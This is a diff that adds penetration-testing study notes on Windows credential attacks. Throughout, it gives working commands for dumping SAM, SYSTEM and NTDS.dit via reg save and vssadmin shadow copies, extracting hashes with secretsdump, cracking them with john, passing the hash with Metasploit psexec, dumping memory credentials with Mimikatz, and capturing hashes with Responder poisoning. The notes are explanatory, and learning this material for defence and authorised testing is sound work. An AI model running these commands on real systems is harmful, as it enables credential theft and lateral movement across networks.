@@ -1,1 +1,83 @@
+SAM File (Security Account Manager)
+It is located under %SystemRoot%/system32/config/SAM
+It contains local accounts for Windows systems
+Once you obtain SAM and SYSTEM file, then you can launch attacks against password hashes such as brute force, rainbow table etc.
+It can be copied through Shadow or Registry Copy
+SAM file is encrypted by default
+reg save HKLM\SAM ./SAM
+reg save HKLM\SYSTEM ./SYSTEM
+secretsdump.py -sam <SAM_Name> -system <SYSTEM_Name> -hashes lmhash:nthash LOCAL -outputfile <filename>
+  Administrator:500:<LM_HASH>:<NTLM_HASH>:::
+  Guest:500:<LM_HASH>:<NTLM_HASH>:::
 
+LM Hashes
+LM Hashes were used in earlier systems. These are not used actively anymore. For LM Hash value, current systems put NULL value.
+It was active, by default, before Windows Vista/2008
+If password contains any letter, the letter is turned into Capital letter. Therefore, it is not case-sensitive.
+A password can consist of maximum 14 letters. If password is less than 14, it is padded with NULL.
+Password is broken into 2 parts, each with 7 characters. Each part is encrypted with DES. Eventually, we obtain 2 hashes with 8 bytes.
+These hashes are concatenated;thus, 16 bytes hash is created.
+No salting operation.
+Brute force attack, rainbow table attacks can be performed.
+john --format=lm <hash_value> --wordlist <wordlist_path>
+
+NTLM Hashes
+Actively used in modern systems.
+It is case-sensitive.
+MD4 is used.
+Without recovering password, pass the hash can be applied.
+No salting.
+john --format=nt <hash_value> --wordlist <wordlist_path>
+
+NTDS.dit
+It is the database of Active Directory.
+It is located under %SystemRoot%\Windows\NTDS
+Favorite file of any attacker.
+It can be copied through Shadow copy
+  vssadmin create shadow /for=C:
+  vssadmin list shadows
+  copy <shadow>\Windows\ntds\ntds.dit ./ntds.dit
+  copy <shadow>\Windows\system32\config\system ./system
+  vssadmin delete shadow /for=C:
+  secretsdump.py -ntds <ntds.dit> -system <SYSTEM_Name> -hashes lmhash:nthash LOCAL -outputfile <filename>
+NTDS.dit file is encrypted by default.
+
+Pass The Hash
+By using hashes gathered during initial exploitation, we can move laterally on the network by performing Pass The Hash attack.
+Metasploit -> exploit/windows/smb/psexec
+
+Mimikatz
+It is used to dump cleartext password, Kerberos ticket, etc from Windows system memory.
+Once you have a meterpreter shell, you can load mimikatz
+load mimikatz
+load kiwi
+-> mimikatz_command -f sekurlsa::logonPasswords
+-> mimikatz_command -f sekurlsa::searchPasswords
+-> creds_all
+Mitigation : Windows Defender Credential Guard
+
+Windows Authentication
+Basically, Kerberos and NTLM Challange & Response authentication mechanisms are used in Windows environment.
+
+NTLM C & R
+LM - NTLM not equal to NTLMv1 - NTLMv2 - NetNTLM
+You cannot perform pass the hash with NetNTLM, but you can relay
+
+LLMNR & NetBIOS-NS Poisoining
+LLMNR (Link Local Multicast Name Resolution) is used in LAN in order to resolve IP-hostname. Once you get no result with DNS, LLMNR is used.
+LLMNR works on TCP/UDP  5355
+NetBIOS (Network Basic Input/Output Service) is an API used to communicate among systems in LAN. NetBIOS-NS (Name Service) is used to resolve names. TCP/UDP Port No 137
+
+Resolving steps in Windows systems
+1) Local DNS Cache
+2) Hosts file
+3) DNS
+4) LLMNR
+5) NetBIOS-NS
+
+LLMNR and NetBIOS-NS packets are broadcasted. The first system that responds to can capture the NetNTLM hash of the target user.
+This NetNTLM C & R hash cannot pass the hash.
+Can be performed cracking or smb relay.
+Responder is used to perform LLMNR and NetBIOS poisoining.
+responder -I <interface>
+john <hash_file> --format=netntlmv2 --wordlist=<wordlist>
